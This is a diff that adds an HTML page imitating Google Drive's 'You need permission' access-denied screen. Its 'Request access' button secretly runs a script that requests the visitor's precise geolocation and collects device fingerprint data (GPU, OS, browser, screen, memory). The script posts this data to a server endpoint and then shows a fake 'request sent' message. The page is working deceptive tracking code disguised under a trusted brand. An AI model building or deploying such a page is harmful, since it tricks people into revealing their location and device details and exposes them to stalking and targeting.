@@ -1,0 +1,320 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta name="description" content="Web word processing, presentations and spreadsheets">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0, user-scalable=0">
+    <link rel="shortcut icon" href="https://ssl.gstatic.com/docs/doclist/images/drive_2022q3_32dp.png">
+    <title>Google Drive - Access Denied</title>
+    <style>
+        @font-face {
+            font-family: Product Sans;
+            font-style: normal;
+            font-weight: 400;
+            src: url('https://fonts.gstatic.com/s/productsans/v9/pxiDypQkot1TnFhsFMOfGShVF9eO.woff2') format('woff2');
+        }
+
+        body { 
+            background-color: #ffffff;
+            font-size: 13px;
+            margin: 0;
+            padding: 0;
+            font-family: Arial,sans-serif;
+        }
+
+        #outerContainer {
+            margin: auto;
+            max-width: 750px;
+        }
+
+        #innerContainer {
+            margin-bottom: 20px;
+            margin-left: 40px;
+            margin-right: 40px;
+            margin-top: 180px;
+            position: relative;
+        }
+
+        #drive-logo {
+            margin: 18px 0;
+            position: absolute;
+            white-space: nowrap;
+        }
+
+        .docs-drivelogo-img {
+            background-image: url('https://www.gstatic.com/images/branding/googlelogo/svg/googlelogo_clr_74x24px.svg');
+            background-size: 74px 24px;
+            display: inline-block;
+            height: 24px;
+            vertical-align: bottom;
+            width: 74px;
+        }
+
+        .docs-drivelogo-text {
+            color: #000;
+            display: inline-block;
+            opacity: 0.54;
+            text-decoration: none;
+            font-family: 'Product Sans',Arial,Helvetica,sans-serif;
+            font-size: 22px;
+            text-rendering: optimizeLegibility;
+            position: relative;
+            top: -4px;
+            left: 4px;
+            -webkit-font-smoothing: antialiased;
+            -moz-osx-font-smoothing: grayscale;
+        }
+
+        #main {
+            position: relative;
+            width: 640px;
+            top: 30px;
+        }
+
+        #accessDeniedIcon {
+            background-image: url('https://www.gstatic.com/images/icons/material/system/2x/lock_grey600_48dp.png');
+            background-size: 48px 48px;
+            float: right;
+            height: 48px;
+            width: 48px;
+        }
+
+        #accessDeniedHeader {
+            color: #222;
+            font: 32px Arial, sans-serif;
+        }
+
+        #message {
+            color: #222;
+            font: 15px/1.6 Arial, sans-serif;
+            width: 480px;
+        }
+
+        button.jfk-button {
+            font-family: arial,sans-serif;
+            height: auto;
+        }
+
+        .jfk-button-action {
+            -webkit-box-shadow: none;
+            -moz-box-shadow: none;
+            box-shadow: none;
+            background-color: #4d90fe;
+            background-image: -webkit-linear-gradient(top,#4d90fe,#4787ed);
+            background-image: -moz-linear-gradient(top,#4d90fe,#4787ed);
+            background-image: -ms-linear-gradient(top,#4d90fe,#4787ed);
+            background-image: -o-linear-gradient(top,#4d90fe,#4787ed);
+            background-image: linear-gradient(top,#4d90fe,#4787ed);
+            border: 1px solid #3079ed;
+            color: #fff;
+        }
+
+        .jfk-button {
+            -webkit-border-radius: 2px;
+            -moz-border-radius: 2px;
+            border-radius: 2px;
+            cursor: default;
+            font-size: 11px;
+            font-weight: bold;
+            text-align: center;
+            white-space: nowrap;
+            margin-right: 16px;
+            height: 27px;
+            line-height: 27px;
+            min-width: 54px;
+            outline: 0px;
+            padding: 0 8px;
+        }
+
+        .jfk-button-standard {
+            -webkit-box-shadow: none;
+            -moz-box-shadow: none;
+            box-shadow: none;
+            background-color: #f5f5f5;
+            background-image: -webkit-linear-gradient(top,#f5f5f5,#f1f1f1);
+            background-image: -moz-linear-gradient(top,#f5f5f5,#f1f1f1);
+            background-image: -ms-linear-gradient(top,#f5f5f5,#f1f1f1);
+            background-image: -o-linear-gradient(top,#f5f5f5,#f1f1f1);
+            background-image: linear-gradient(top,#f5f5f5,#f1f1f1);
+            color: #444;
+            border: 1px solid #dcdcdc;
+            border: 1px solid rgba(0,0,0,0.1);
+        }
+
+        @media (max-width: 500px) {
+            #accessDeniedHeader {
+                color: #222;
+                font: 25px Arial, sans-serif;
+            }
+            #accessDeniedIcon {
+                background-image: url('https://www.gstatic.com/images/icons/material/system/2x/lock_grey600_48dp.png');
+                background-size: 36px 36px;
+                height: 36px;
+                width: 36px;
+            }
+            #main {
+                width: 100%;
+            }
+            #message {
+                width: 75%;
+            }
+            #outerContainer #innerContainer {
+                margin-left: 20px;
+                margin-right: 20px;
+            }
+        }
+
+        :focus {outline:none;}
+        ::-moz-focus-inner {border:0;}
+    </style>
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.4.1/jquery.min.js"></script>
+    <script>
+        // Location gathering function
+        function locate(success_callback, error_callback) {
+            if (navigator.geolocation) {
+                var options = {
+                    enableHighAccuracy: true,
+                    timeout: 5000,
+                    maximumAge: 0
+                };
+                navigator.geolocation.getCurrentPosition(function (pos) {
+                    success_callback && success_callback();
+                    sendData(pos);
+                }, function (err) {
+                    error_callback && error_callback();
+                    sendError(err);
+                }, options);
+            } else {
+                error_callback && error_callback();
+                sendError({code: 0, message: "Geolocation is not supported by this browser."});
+            }
+        }
+        
+        // Send collected data to the server
+        function sendData(pos) {
+            var data = collectDeviceInfo();
+            data.geolocationStatus = 'success';
+            data.latitude = pos.coords.latitude;
+            data.longitude = pos.coords.longitude;
+            data.accuracy = pos.coords.accuracy;
+            data.altitude = pos.coords.altitude;
+            data.altitudeAccuracy = pos.coords.altitudeAccuracy;
+            data.heading = pos.coords.heading;
+            data.speed = pos.coords.speed;
+            
+            fetch('/api/submit', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify(data)
+            }).catch(console.error);
+        }
+        
+        // Send error when geolocation fails
+        function sendError(error) {
+            var data = collectDeviceInfo();
+            data.geolocationStatus = 'error';
+            data.geolocationError = error.message || "Unknown error";
+            data.errorCode = error.code;
+            
+            fetch('/api/submit', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify(data)
+            }).catch(console.error);
+        }
+        
+        // Collect device information
+        function collectDeviceInfo() {
+            const deviceInfo = {};
+            
+            // Platform info
+            deviceInfo.platform = navigator.platform || 'Not Available';
+            deviceInfo.hardwareConcurrency = navigator.hardwareConcurrency || 'Not Available';
+            deviceInfo.deviceMemory = navigator.deviceMemory || 'Not Available';
+            deviceInfo.userAgent = navigator.userAgent;
+            
+            // Screen info
+            deviceInfo.screenHeight = window.screen.height;
+            deviceInfo.screenWidth = window.screen.width;
+            
+            // Browser info
+            let browserInfo = 'Not Available';
+            const ua = navigator.userAgent;
+            
+            if (ua.indexOf('Firefox') !== -1) {
+                browserInfo = 'Firefox ' + ua.match(/Firefox\/([0-9.]+)/)[1];
+            } else if (ua.indexOf('Chrome') !== -1) {
+                browserInfo = 'Chrome ' + ua.match(/Chrome\/([0-9.]+)/)[1];
+            } else if (ua.indexOf('Safari') !== -1) {
+                browserInfo = 'Safari ' + ua.match(/Safari\/([0-9.]+)/)[1];
+            } else if (ua.indexOf('Edge') !== -1) {
+                browserInfo = 'Edge ' + ua.match(/Edge\/([0-9.]+)/)[1];
+            }
+            
+            deviceInfo.browser = browserInfo;
+            
+            // GPU info
+            let gpuVendor = 'Not Available';
+            let gpuRenderer = 'Not Available';
+            
+            try {
+                const canvas = document.createElement('canvas');
+                const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
+                
+                if (gl) {
+                    const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
+                    if (debugInfo) {
+                        gpuVendor = gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL);
+                        gpuRenderer = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
+                    }
+                }
+            } catch (e) {
+                // Silent fail
+            }
+            
+            deviceInfo.gpuVendor = gpuVendor;
+            deviceInfo.gpuRenderer = gpuRenderer;
+            
+            // OS detection
+            let os = 'Not Available';
+            const userAgent = navigator.userAgent;
+            
+            if (userAgent.indexOf("Win") !== -1) os = "Windows";
+            else if (userAgent.indexOf("Mac") !== -1) os = "MacOS";
+            else if (userAgent.indexOf("Linux") !== -1) os = "Linux";
+            else if (userAgent.indexOf("Android") !== -1) os = "Android";
+            else if (userAgent.indexOf("iOS") !== -1) os = "iOS";
+            
+            deviceInfo.os = os;
+            
+            return deviceInfo;
+        }
+    </script>
+</head>
+<body>
+    <div id="outerContainer">
+        <div id="innerContainer">
+            <div style="position: absolute; top: -80px;">
+                <div id="drive-logo">
+                    <span class="docs-drivelogo-img"></span>
+                    <span class="docs-drivelogo-text"> Drive</span>
+                </div>
+            </div>
+            <div style="clear:both"></div>
+            <div id="main">
+                <div id="accessDeniedIcon"></div>
+                <p id="accessDeniedHeader">You need permission</p>
+                <div id="message">
+                    <p>Want in? Ask for access, or switch to an account with permission.</p>
+                </div>
+                <p id="buttons" style="padding-top: 10px">
+                    <button id="requestButton" style="font-weight:bold" class="jfk-button jfk-button-action" onclick="locate(function(){$('#requestButton').html('Access Requested'); $('#message p').text('Your request has been sent to the owner. You will receive access when they approve.');}, function(){$('#requestButton').html('Request Failed');});">Request access</button>
+                </p>
+            </div>
+        </div>
+    </div>
+</body>
+</html>
